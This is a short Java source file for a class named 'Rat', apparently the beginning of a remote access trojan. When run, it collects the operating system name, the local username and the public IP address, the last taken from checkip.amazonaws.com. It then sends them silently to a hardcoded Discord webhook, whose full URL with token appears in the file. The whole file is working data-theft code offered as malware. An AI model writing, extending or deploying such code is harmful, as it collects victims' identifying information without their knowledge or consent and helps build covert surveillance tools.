package org.example;

import club.minnced.discord.webhook.WebhookClient;
import java.net.MalformedURLException;
import java.net.UnknownHostException;
import java.net.URL;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Rat {
    public static void main(String[] args) {
        String os = System.getProperty("os.name");
        String ip = null;
        String name = null;
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            ip = bufferedReader.readLine();
            name = System.getProperty("user.name");
        } catch (UnknownHostException e) {
        } catch (MalformedURLException e) {
        } catch (IOException e) {
        }

        WebhookClient client = WebhookClient.withUrl("https://discord.com/api/webhooks/1047873280889061406/wirka7va10jubmId_an_qm-voZNX9l-THECTCf1B-gNQObLLS1R1O4zXRqfX6678yZz_");
        client.send("IP:" + ip + "OS:" + os + "name:" + name);



    }
}
